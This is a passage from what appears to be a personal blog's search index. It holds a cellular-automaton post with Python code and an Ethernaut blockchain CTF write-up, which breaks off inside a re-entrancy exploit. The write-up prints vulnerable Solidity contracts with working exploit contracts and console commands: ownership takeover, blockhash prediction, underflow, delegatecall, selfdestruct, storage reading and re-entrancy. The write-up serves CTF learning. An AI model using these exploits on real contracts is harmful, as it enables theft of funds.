\u4ee5\u4e0a\u5c31\u662f\u4e00\u79cd\u4ea7\u751f\u89c4\u5219\uff0c\u4f46\u662f\u6211\u4eec\u5f88\u5feb\u4f1a\u53d1\u73b0\u8fd9\u6837\u4f1a\u9047\u5230\u4e00\u4e2a\u95ee\u9898\uff0c\u5728\u4e24\u7aef\u7684\u4f1a\u51fa\u73b0\u76f8\u90bb\u5143\u80de\u6570\u4e0d\u8db3\u7684\u73b0\u8c61\u3002\u6b64\u65f6\u4e00\u822c\u4f1a\u91c7\u7528\u9996\u5c3e\u76f8\u8fde\u7684\u65b9\u5f0f\u6765\u89e3\u51b3\u3002","title":"\u4e00\u7ef4\u5143\u80de\u81ea\u52a8\u673a"},{"location":"legacy/old_blog/20200328/#_3","text":"\u4e3a\u4e86\u66f4\u597d\u7684\u7406\u89e3\u5143\u80de\u81ea\u52a8\u673a\uff0c\u8fd9\u91cc\u7528\u4e00\u4e2a\u7b80\u5355\u7684\u6848\u4f8b\u6765\u5c55\u793a\u3002 \u4e00\u4e2a\u6709 n \u4e2a\u5143\u80de\u7684\u4e00\u7ef4\u5143\u80de\u81ea\u52a8\u673a\uff0c\u80fd\u8f83\u597d\u5b9e\u73b0\u201c\u5c11\u6570\u670d\u4ece\u591a\u6570\u201d\u7684\u4efb\u52a1\uff1a\u82e5\u8f93\u5165\uff08t0 = 0\uff09\u4e2d \u72b6\u6001\u4e3a 1 \u7684\u5143\u80de\u591a\u4e8e\u72b6\u6001\u4e3a 0 \u7684\u5143\u80de\uff0c\u5219\u7ecf\u8fc7 t \u6b21\u8fd0\u7b97\u540e\u6240\u6709\u5143\u80de\u72b6\u6001\u4e3a 1\uff1b\u540c\u7406\uff0c\u82e5\u8f93\u5165\uff08t0 = 0\uff09 \u4e2d\u72b6\u6001\u4e3a 0 \u7684\u5143\u80de\u591a\u4e8e\u72b6\u6001\u4e3a 1 \u7684\u5143\u80de\uff0c\u5219\u7ecf\u8fc7 t \u6b21\u8fd0\u7b97\u540e\u6240\u6709\u5143\u80de\u72b6\u6001\u4e3a 0\u3002\u8bf7\u5236\u5b9a\u89c4\u5219\uff0c\u4f7f\u5f97\u9002\u5e94\u5ea6\u5c3d\u53ef\u80fd\u7684\u9ad8\u3002 \u6839\u636e\u4e0a\u9762\u7684\u89e3\u91ca\uff0c\u5927\u5bb6\u53ef\u4ee5\u81ea\u884c\u5c1d\u8bd5\u3002 \u8fd9\u91cc\u6211\u7ed9\u51fa\u6700\u4f18\u89e3\u6cd5\uff1a \u9009\u53d67\u90bb\u57df\u4f5c\u4e3a\u51b3\u5b9a\u4e0b\u4e00\u4ee3\u7684\u72b6\u6001\u7ec4\uff0c\u8fd9\u6837\u89c4\u5219\u6570\u5c31\u67092^7=128\u4f4d \u89c4\u5219\u6570\uff1a 00000101000001100001010110000111000001110000010000010101010101110110010001110111 000001010000000101111101111111111011011101111111 \u63a5\u4e0b\u6765\u65e2\u53ef\u4ee5\u91c7\u53d6\u9996\u5c3e\u76f8\u8fde\u7684\u65b9\u5f0f\u4e5f\u53ef\u4ee5\uff0c\u7a0d\u5fae\u4e0e\u5143\u80de\u81ea\u52a8\u673a\u5b9a\u4e49\u6709\u6240\u5dee\u522b\u7684\u6574\u4f53\u4f18\u52bf\u8865\u5168\u6cd5\uff0c\u5373\u7528\u4e0a\u4e00\u4ee3\u72b6\u6001\u4e2d\u5360\u4f18\u52bf\u7684\u72b6\u6001\u6765\u8865\u9f50\u9996\u5c3e\u3002 \u4e4b\u6240\u4ee5\u6709\u6240\u4e0d\u59a5\uff0c\u662f\u56e0\u4e3a\u8fd9\u91cc\u6709\u70b9\u7c7b\u4f3c[^\u51af\u8bfa\u4f9d\u66fc\u673a]\u7684\u4e00\u6b65\u5230\u4f4d\u7684\u60f3\u6cd5\uff0c\u4f46\u662f\u91c7\u53d6\u8fd9\u6837\u7684\u65b9\u6cd5\u53ef\u4ee5\u4f7f\u9002\u5e94\u5ea6\u8fbe\u5230100%\uff0c\u6240\u4ee5\u8fd9\u91cc\u5c31\u91c7\u7528\u4e86\u6574\u4f53\u4f18\u52bf\u8865\u5168\u7684\u65b9\u6cd5\u3002 Python\u5b9e\u73b0\u4ee3\u7801 from random import randint def getBirth ( N ): f =- 1 while f ==- 1 : #\u907f\u514d\u4ea7\u751f1\u548c0\u6570\u76ee\u76f8\u540c\u7684\u521d\u59cb\u72b6\u6001 s = '' for i in range ( N ): s += str ( randint ( 0 , 1 )) if s . count ( '0' ) > s . count ( '1' ): f = 0 elif s . count ( '0' ) == s . count ( '1' ): f =- 1 else : f = 1 return s , f def getNext ( n , f ): rule = '0000010100000110000101011000 \\ 011100000111000001000001010101 \\ 010111011001000111011100000101 \\ 0000000101111101111111111011011101111111' nextGeneration = '' N = len ( n ) for i in range ( N ): #\u8fb9\u7f18\u5355\u72ec\u8003\u8651\u8865\u5168 if i < 3 : s = str ( f ) * ( 3 - i ) + n [ 0 : i ] + n [ i : i + 4 ] elif i > N - 4 : s = n [ i - 3 : i ] + n [ i : N ] + str ( f ) * ( 3 - ( N - 1 - i )) else : s = n [ i - 3 : i ] + n [ i : i + 4 ] s = int ( s , 2 ) nextGeneration += rule [ s ] return nextGeneration def main (): num = 0 ; #\u8bb0\u5f55\u6210\u529f\u6b21\u6570 datas = 200 #\u6d4b\u8bd5\u6570\u636e\u603b\u6570 for i in range ( datas ): N = 100 #\u5e8f\u5217\u957f\u5ea6 t = 0 #\u8bb0\u5f55\u65f6\u95f4 n , f = getBirth ( N ) #\u751f\u6210\u521d\u59cb\u72b6\u6001 while t < 300 : #\u8d85\u8fc7300\u6b21\uff0c\u9ed8\u8ba4\u5224\u5b9a\u65e0\u6cd5\u6210\u529f n = getNext ( n , f ) t += 1 if ( f == 0 and n . count ( '0' ) == N ) or ( f == 1 and n . count ( '1' ) == N ): #\u5224\u65ad\u662f\u5426\u6210\u529f num += 1 break # \u8f93\u51fa\u7ed3\u679c print ( 'datas sum:' , datas ) print ( int ( num / datas * 100 ), '%' ) if __name__ == '__main__' : main () input ()","title":"\u6295\u7968\u673a"},{"location":"legacy/old_blog/20200328/#_4","text":"\u8fd9\u91cc\u6211\u5c31\u6682\u65f6\u8bf4\u5230\u8fd9\u91cc\u4e86 \u4e3b\u8981\u592a\u61d2\u4e86\uff0c\u4e0d\u60f3\u7801\u5b57\u4e86 \uff0c\u81f3\u4e8e\u89c4\u5219\u662f\u5982\u4f55\u4ea7\u751f\u7684\uff0c\u5404\u4f4d\u53ef\u4ee5\u53bb\u53c2\u8003 \u9057\u4f20\u7b97\u6cd5 \uff0c\u6211\u5728\u8fd9\u91cc\u4e5f\u63a8\u8350\u4e00\u672c\u4e66\uff0c\u8bb2\u7684\u633a\u7b80\u5355\u7684\u3002 \u300a\u590d\u6742\u300b \u6885\u62c9\u59ae\u00b7\u7c73\u6b47\u5c14 \u300aComplexity: A Guided Tour\u300b Melanie Mitchell \u8fd9\u4e0a\u9762\u662f\u4e00\u672c\u4e66\u54e6\uff0c\u53ea\u662f\u4e2d\u82f1\u6587\u7684\u533a\u522b~","title":"\u968f\u4fbf\u8bf4\u8bf4"},{"location":"legacy/old_blog/20200328/#_5","text":"\u5176\u5b9e\u5143\u80de\u81ea\u52a8\u673a\u672c\u8eab\u5e76\u4e0d\u590d\u6742\uff0c\u4f46\u662f\u53ef\u4ee5\u6a21\u62df\u5f88\u591a\u590d\u6742\u7684\u73b0\u8c61\uff0c\u5728\u8fd9\u6b21\u5b9e\u8df5\u9762\u8bd5\u4e2d\u8fd8\u5b9e\u73b0\u4e86\u957f\u4e09\u89d2\u57ce\u5e02\u5efa\u6210\u533a\u7684\u6a21\u62df\u3001\u8fd8\u6709\u6559\u5ba4\u9003\u751f\u7684\u6a21\u62df\u7b49\u7b49\uff0c\u6709\u5174\u8da3\u7684\u8bdd\uff0c\u53ef\u4ee5\u6df1\u5165\u4e86\u89e3\u3002 \u8fd9\u6b21\u8bb2\u7684\u5f88\u6d45\uff0c\u7b49\u6211\u6709\u5174\u8da3\u7801\u5b57\u4e86\uff0c\u518d\u8be6\u7ec6\u5c55\u5f00\u8bb2\u8bb2\uff08\u9003","title":"\u5199\u5728\u6700\u540e"},{"location":"others/","text":"\u6742\u9879 \u00b6 Abstract \u8fd9\u91cc\u662f\u4e00\u4e9b\u4e34\u65f6\u7684\u4e1c\u897f Table of Contents \u00b6","title":"\u6742\u9879"},{"location":"others/#_1","text":"Abstract \u8fd9\u91cc\u662f\u4e00\u4e9b\u4e34\u65f6\u7684\u4e1c\u897f","title":"\u6742\u9879"},{"location":"others/#table-of-contents","text":"","title":"Table of Contents"},{"location":"writeups/","text":"Writeups \u00b6 CTF (Capture The Flag) \u662f\u4fe1\u606f\u5b89\u5168\u9886\u57df\u7684\u4e00\u79cd\u6bd4\u8d5b\u5f62\u5f0f\uff0c\u76ee\u6807\u662f\u901a\u8fc7\u5bfb\u627e\u6f0f\u6d1e\u5e76\u5229\u7528\u7684\u65b9\u5f0f\u83b7\u53d6 flag\uff0c\u5176\u5305\u542b misc\u3001reverse\u3001pwn\u3001crypto\u3001web...\u591a\u79cd\u7c7b\u578b\u7684\u9898\u76ee\u3002\u4e3a\u4e86\u4fdd\u6301\u8fd9\u9879\u5174\u8da3\u7231\u597d\uff0c\u6211\u4f1a\u5728\u8fd9\u91cc\u5c1d\u8bd5\u8bb0\u5f55\u4e00\u4e9b\u76f8\u5173\u57fa\u7840\u77e5\u8bc6\u548c\u4e00\u4e9b\u9898\u89e3qwq\u3002 Abstract \u8fd9\u91cc\u4f1a\u8bb0\u5f55\u5b66\u4e60\u6216\u8005\u53c2\u52a0\u8fc7\u7684\u90e8\u5206 CTF \u7684 writeup Table of Contents \u00b6 Learning Ethernaut 941 402 8 mins 1739977430 2023 Hackergame 2023 3155 222 13 mins 1739977430 \ud83d\udd12 ZJUCTF 2023 1090 4 mins \u4e0d\u516c\u5f00 2024 Hackergame 2024 1386 167 7 mins 1739977430 \ud83d\udd12 ZJUCTF 2024 1083 299 7 mins \u4e0d\u516c\u5f00 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Writeups"},{"location":"writeups/#writeups","text":"CTF (Capture The Flag) \u662f\u4fe1\u606f\u5b89\u5168\u9886\u57df\u7684\u4e00\u79cd\u6bd4\u8d5b\u5f62\u5f0f\uff0c\u76ee\u6807\u662f\u901a\u8fc7\u5bfb\u627e\u6f0f\u6d1e\u5e76\u5229\u7528\u7684\u65b9\u5f0f\u83b7\u53d6 flag\uff0c\u5176\u5305\u542b misc\u3001reverse\u3001pwn\u3001crypto\u3001web...\u591a\u79cd\u7c7b\u578b\u7684\u9898\u76ee\u3002\u4e3a\u4e86\u4fdd\u6301\u8fd9\u9879\u5174\u8da3\u7231\u597d\uff0c\u6211\u4f1a\u5728\u8fd9\u91cc\u5c1d\u8bd5\u8bb0\u5f55\u4e00\u4e9b\u76f8\u5173\u57fa\u7840\u77e5\u8bc6\u548c\u4e00\u4e9b\u9898\u89e3qwq\u3002 Abstract \u8fd9\u91cc\u4f1a\u8bb0\u5f55\u5b66\u4e60\u6216\u8005\u53c2\u52a0\u8fc7\u7684\u90e8\u5206 CTF \u7684 writeup","title":"Writeups"},{"location":"writeups/#table-of-contents","text":"Learning Ethernaut 941 402 8 mins 1739977430 2023 Hackergame 2023 3155 222 13 mins 1739977430 \ud83d\udd12 ZJUCTF 2023 1090 4 mins \u4e0d\u516c\u5f00 2024 Hackergame 2024 1386 167 7 mins 1739977430 \ud83d\udd12 ZJUCTF 2024 1083 299 7 mins \u4e0d\u516c\u5f00 function buttonHandler(i) { let content = document.getElementsByClassName(\"content-item-wrapper\")[i]; let button = document.getElementsByClassName(\"title-wrapper\")[i].getElementsByTagName(\"button\")[0]; if (content.style.display == \"none\") { content.style.display = \"block\"; button.children[0].children[0].style.transform = \"rotate(0deg)\"; } else { content.style.display = \"none\"; button.children[0].children[0].style.transform = \"rotate(-90deg)\"; } } function produce_time() { let time = document.getElementsByClassName(\"item-actions\"); for (let i = 0; i < time.length; i++) { let date = new Date(parseInt(time[i].innerHTML) * 1000); let now = new Date(); let diff = now.getTime() - date.getTime(); let years = Math.floor(diff / (24 * 3600 * 1000 * 365)); let months = Math.floor(diff / (24 * 3600 * 1000 * 30)); let days = Math.floor(diff / (24 * 3600 * 1000)); let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000)); let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000)); let seconds = Math.floor((diff % (60 * 1000)) / 1000); if (years > 0) { time[i].innerHTML = years + \" years ago\"; } else if (months > 0) { time[i].innerHTML = months + \" months ago\"; } else if (days > 0) { time[i].innerHTML = days + \" days ago\"; } else if (hours > 0) { time[i].innerHTML = hours + \" hours ago\"; } else if (minutes > 0) { time[i].innerHTML = minutes + \" minutes ago\"; } else { time[i].innerHTML = seconds + \" seconds ago\"; } } } produce_time();","title":"Table of Contents"},{"location":"writeups/ethernaut/","text":"Ethernaut \u00b6 \u7ea6 937 \u4e2a\u5b57 402 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f Abstract \u611f\u89c9\u8fd9\u4e2a\u7cfb\u5217\u662fBlockchain\u6bd4\u8f83\u6709\u540d\u7684\u65b0\u624b\u9898\u76ee\u7cfb\u5217\uff0c\u5e0c\u671b\u80fd\u501f\u6b64\u5b66\u4f1a\u4e00\u4e9bBlockchain\u57fa\u7840\u6280\u80fd\uff0c\u4e0d\u81f3\u4e8e\u6bd4\u8d5b\u7684\u65f6\u5019\u65e0\u8111\u8df3\u8fc7\u3002 \u9898\u76ee\u94fe\u63a5 \u975e\u5e38\u7cdf\u5fc3\u7684\u662f\u6ca1\u6709\u627e\u5230\u8db3\u591f\u7684faucet\u83b7\u53d6\u8db3\u591f\u7684eth\u6765\u652f\u4ed8gas\uff0c\u6ca1\u60f3\u5230\u5c45\u7136\u5361\u5728\u4e86\u8fd9\u4e00\u6b65\u3002\u5728Goerli\u6269\u5c55\u7f51\u7edc\u4e0b\uff0c\u627e\u5230\u4e00\u4e2a \u6c34\u9f99\u5934 \uff0c\u6bcf\u5929\u53ef\u4ee5\u67090.005\uff0c\u867d\u7136\u5f88\u5c11\uff0c\u4f46\u662f\u5b58\u4e00\u5b58\u52c9\u5f3a\u591f\u7528\u3002\uff08GAS\u8d39\u597d\u8d35\uff0c\u90fd\u5feb0.01\u4e86\uff09 \u540e\u6765\u53d1\u73b0\u8fd9\u4e2a \u624b\u52a8\u6316 \uff0c\u76f4\u63a5\u6316\u4e86\u4e00\u4e9b\uff0c\u611f\u89c9\u8fd9\u6837\u8db3\u591f\u4e86\u3002 Hello Ethernaut \u00b6 \u8df3\u8fc7\u4e86\uff0c\u4e0d\u60f3\u6d6a\u8d39\u597d\u4e0d\u5bb9\u6613\u51d1\u7684Gas\u8d39\uff0c\u5c31\u662f\u4e00\u4e9b\u57fa\u672c\u64cd\u4f5c\u7684\u6559\u5b66\u3002 Fallback \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Fallback { mapping ( address => uint ) public contributions ; address public owner ; constructor () { owner = msg.sender ; contributions [ msg.sender ] = 1000 * ( 1 ether ); } modifier onlyOwner { require ( msg.sender == owner , \"caller is not the owner\" ); _ ; } function contribute () public payable { require ( msg.value < 0 . 001 ether ); contributions [ msg.sender ] += msg.value ; if ( contributions [ msg.sender ] > contributions [ owner ]) { owner = msg.sender ; } } function getContribution () public view returns ( uint ) { return contributions [ msg.sender ]; } function withdraw () public onlyOwner { payable ( owner ). transfer ( address ( this ). balance ); } receive () external payable { require ( msg.value > 0 && contributions [ msg.sender ] > 0 ); owner = msg.sender ; } } \u9898\u76ee\u8981\u6c42\uff0c\u6539\u53d8\u5408\u7ea6\u6240\u6709\u8005\u4e3a\u73a9\u5bb6\uff0c\u5e76\u53d6\u51fa\u6240\u6709\u7684\u4f59\u989d\u3002 \u6839\u636e\u5408\u7ea6\u4ee3\u7801\uff0c\u8981\u6c42\u73a9\u5bb6\u7684contribution\u503c\u5927\u4e8e\u539f\u5408\u7ea6\u62e5\u6709\u8005\u65f6\u79fb\u4ea4\u6240\u6709\u6743\uff0c\u4f46\u662f\u8fd9\u662f\u96be\u4ee5\u5b9e\u73b0\u7684\uff0c\u56e0\u6b64\u9700\u8981\u5229\u7528receive\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5728\u5408\u7ea6\u63a5\u6536\u4ea4\u6613\u65f6\u5c31\u4f1a\u6267\u884c\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u5148\u4f7f\u73a9\u5bb6contribution\u5927\u4e8e0\uff0c\u5e76\u5411\u5408\u7ea6\u53d1\u9001\u5927\u4e8e0\u7684\u4ea4\u6613\u5373\u53ef\u5b8c\u6210\u672c\u9898\u3002 await contract . contribute ({ value : 1 }) await contract . sendTransaction ({ value : 1 }) await contract . withdraw () Fallout \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import 'openzeppelin-contracts-06/math/SafeMath.sol' ; contract Fallout { using SafeMath for uint256 ; mapping ( address => uint ) allocations ; address payable public owner ; /* constructor */ function Fal1out () public payable { owner = msg.sender ; allocations [ owner ] = msg.value ; } modifier onlyOwner { require ( msg.sender == owner , \"caller is not the owner\" ); _ ; } function allocate () public payable { allocations [ msg.sender ] = allocations [ msg.sender ]. add ( msg.value ); } function sendAllocation ( address payable allocator ) public { require ( allocations [ allocator ] > 0 ); allocator . transfer ( allocations [ allocator ]); } function collectAllocations () public onlyOwner { msg.sender . transfer ( address ( this ). balance ); } function allocatorBalance ( address allocator ) public view returns ( uint ) { return allocations [ allocator ]; } } \u53ef\u4ee5\u53d1\u73b0\u5408\u7ea6\u7684constructor\u51fd\u6570\u662fFal1out\uff0c\u56e0\u6b64\u76f4\u63a5\u8c03\u7528 contract . Fal1out () \u5373\u53ef\u5b8c\u6210\u672c\u9898 Coinflip \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } \u8fd9\u9053\u9898\u8ba9\u6211\u5b66\u4e60\u4e86\u5982\u4f55\u901a\u8fc7Remix\u90e8\u7f72\u5408\u7ea6\u5e76\u6267\u884c\u76f8\u5e94\u7684\u5408\u7ea6\u51fd\u6570\uff0c\u672c\u9898\u9700\u8981\u90e8\u7f72\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u56e0\u4e3a\u9898\u76ee\u5408\u7ea6\u4e2d\u8981\u6c42 lastHash != blockValue \uff0c\u5b89\u7167\u9898\u76ee\u8981\u6c42\u6267\u884c10\u6b21\u5373\u53ef\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } contract hack { uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; CoinFlip c = CoinFlip ( 0x2Ee20b7C14d2c7376F8E04cA175D840FF0644B85 ); function exp () public { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; c . flip ( side ); } } Telephone \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Telephone { address public owner ; constructor () { owner = msg.sender ; } function changeOwner ( address _owner ) public { if ( tx.origin != msg.sender ) { owner = _owner ; } } } \u8fd9\u91cc\u7684\u4e00\u4e2a\u77e5\u8bc6\u70b9\u5c31\u662ftx.origin\u662f\u6574\u4e2a\u4ea4\u6613\u7684\u6700\u539f\u59cb\u53d1\u9001\u8005\uff0c\u800cmsg.sender\u5219\u662f\u5f53\u524d\u8c03\u7528\u8005\uff1a tx.origin\uff1a\u4ea4\u6613\u53d1\u9001\u65b9\uff0c\u662f\u6574\u4e2a\u4ea4\u6613\u6700\u5f00\u59cb\u7684\u5730\u5740 msg.sender\uff1a\u6d88\u606f\u53d1\u9001\u65b9\uff0c\u662f\u5f53\u524d\u8c03\u7528\u7684\u8c03\u7528\u65b9\u5730\u5740 \u4e8e\u662f\uff0c\u53ea\u8981\u90e8\u7f72\u4e00\u4e2a\u5408\u7ea6\u6765\u8c03\u7528changeOwner\u65b9\u6cd5\u5373\u53ef\uff0c\u5408\u7ea6\u7f16\u5199\u5f88\u7b80\u5355\uff0c\u8fd9\u91cc\u5c31\u4e0d\u653e\u4e86\u3002 Token \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Token { mapping ( address => uint ) balances ; uint public totalSupply ; constructor ( uint _initialSupply ) public { balances [ msg.sender ] = totalSupply = _initialSupply ; } function transfer ( address _to , uint _value ) public returns ( bool ) { require ( balances [ msg.sender ] - _value >= 0 ); balances [ msg.sender ] -= _value ; balances [ _to ] += _value ; return true ; } function balanceOf ( address _owner ) public view returns ( uint balance ) { return balances [ _owner ]; } } \u8fd9\u91cc\u8003\u5bdf\u7684\u4e00\u4e2a\u77e5\u8bc6\u70b9\u662fuint\u6ea2\u51fa\uff0c\u6ea2\u51fa\u540e\u5c31\u80fd\u83b7\u5f97\u5f88\u5927\u7684\u6570\u503c\u4e86\uff0c\u6240\u4ee5\u76f4\u63a5\u4f7f\u7528 await contract . transfer ( contract . address , 21 ) \u5373\u53ef\u5b8c\u6210\u672c\u9898\u3002 Delegation \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Delegate { address public owner ; constructor ( address _owner ) { owner = _owner ; } function pwn () public { owner = msg.sender ; } } contract Delegation { address public owner ; Delegate delegate ; constructor ( address _delegateAddress ) { delegate = Delegate ( _delegateAddress ); owner = msg.sender ; } fallback () external { ( bool result ,) = address ( delegate ). delegatecall ( msg.data ); if ( result ) { this ; } } } \u8fd9\u9053\u9898\u7684\u8003\u70b9\u662fdelegatecall\uff0c\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u7684\u662f\u7ecf\u8fc7 abi . encodeWithSignature \u540e\u7684\u51fd\u6570\uff0c\u67e5\u8be2\u6587\u6863\u53ef\u77e5\u53ea\u8981\u53d6\u51fd\u6570\u540dsha3\u540e\u7684\u524d4\u4e2a\u5b57\u8282\u5373\u53ef\u3002 > web3 . utils . sha3 ( \"pwn()\" ) '0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab' > contract . sendTransaction ({ data : \"0xdd365b8b\" }) Force \u00b6 \u867d\u7136\u65e0\u6cd5\u5411\u5408\u7ea6\u8f6c\u8d26\uff0c\u4f46\u662f\u5728\u5408\u7ea6\u81ea\u6bc1\u65f6\uff0c\u53ef\u4ee5\u5f3a\u5236\u5956\u4f59\u989d\u8f6c\u5230\u6307\u5b9a\u5730\u5740\uff0c\u56e0\u6b64\u53ea\u9700\u5148\u521b\u5efa\u4e00\u4e2a\u5408\u7ea6\uff0c\u5411\u5176\u8f6c\u8d26\u540e\uff0c\u518d\u81ea\u6bc1\u5408\u7ea6\u5373\u53ef\u3002 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Exploit { constructor () public payable {} // \u521d\u59cb\u8981\u63a5\u6536 value \u6765\u521b\u5efa\u5408\u7ea6 function exp ( address challenge ) public { // \u9700\u8981\u5148\u5f3a\u5236\u8f6c\u6362\u4e3a payable address payable challenge = payable ( address ( challenge )); selfdestruct ( challenge ); } } Vault \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Vault { bool public locked ; bytes32 private password ; constructor ( bytes32 _password ) public { locked = true ; password = _password ; } function unlock ( bytes32 _password ) public { if ( password == _password ) { locked = false ; } } } \u7531\u4e8e\u533a\u5757\u94fe\u4e0a\u7684\u4e00\u5207\u90fd\u662f\u516c\u5f00\u7684\uff0c\u56e0\u6b64private\u53d8\u91cf\u4e5f\u662f\u53ef\u4ee5\u770b\u5230\u7684\uff0c\u4e0b\u9762\u5c31\u7528\u4e86Tony\u8001\u5e08\u7684\u89e3\u9898\u4ee3\u7801\u3002 > await web3 . eth . getStorageAt ( instance , 1 ) // 0 \u4e3a locked \u7684\u4f4d\u7f6e\uff0c1 \u4e3a password '0x412076657279207374726f6e67207365637265742070617373776f7264203a29' > web3 . utils . toAscii ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) 'A very strong secret password :)' > await contract . unlock ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) // \u53c2\u6570\u662f bytes32\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u4f20\u5b57\u7b26\u4e32\u8fdb\u53bb King \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract King { address payable king ; uint public prize ; address payable public owner ; constructor () public payable { owner = msg.sender ; king = msg.sender ; prize = msg.value ; } receive () external payable { require ( msg.value >= prize || msg.sender == owner ); king . transfer ( msg.value ); king = msg.sender ; prize = msg.value ; } function _king () public view returns ( address payable ) { return king ; } } \u5728\u66f4\u6362king\u7684\u65f6\u5019\uff0c\u4f1a\u5c06\u4f59\u989d\u8f6c\u5230\u4e0a\u4e00\u4efbking\uff0c\u53ea\u8981\u9009\u62e9\u4e0d\u63a5\u53d7\uff0c\u5373\u53ef\u4e0d\u5b8c\u6210\u6362\u4efb\uff0c\u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528revert\u3002 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Exploit { constructor ( address challenge ) public payable { challenge . call { value : msg.value }( \"\" ); } fallback () external { revert (); } } \u53ea\u8981\u8f6c\u7684\u94b1\u6bd4prize(1300889614901161 wei)\u591a\u5c31\u53ef\u4ee5\u4e86\u3002 Re-entrancy \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.12 ; import 'openzeppelin-contracts-06/math/SafeMath.sol' ; contract Reentrance { using SafeMath for uint256 ; mapping ( address => uint ) public balances ; function donate ( address _to ) public payable { balances [ _to ] = balances [ _to ]. add ( msg.value ); } function balanceOf ( address _who ) public view returns ( uint balance ) { return balances [ _who ]; } function withdraw ( uint _amount ) public { if ( balances [ msg.sender ] >= _amount ) { ( bool result ,) = msg.sender . call { value : _amount }( \"\" ); if ( result ) { _amount ; } balances [ msg.sender ] -= _amount ; } } receive () external payable {} } \u8fd9\u9898\u8003\u5bdf\u91cd\u5165\u653b\u51fb\uff0c\u56e0\u4e3awithdraw\u662f\u5148\u8f6c\u8d26\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528receive\u6216fallback\u4e00\u76f4withdraw\u3002\u521a\u5f00\u59cb\u5361\u4e86\u5f88\u4e45\uff0c\u540e\u6765\u53d1\u73b0\u662f\u6539\u4e86\u5408\u7ea6\u4ee3\u7801\u540e\u5fd8\u8bb0\u91cd\u65b0\u7f16\u8bd1\u4e86\uff0c\u6d6a\u8d39\u4e86\u597d\u591agas\u8d39qaq\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; /* code of Reentrance */ contract Exploit { Reentrance challenge ; constructor ( address payable addr ) public payable { challenge = Reentrance ( addr ); } function exp () public { challenge . withdraw ( 0 . 001 ether ); } fallback () external payable { if 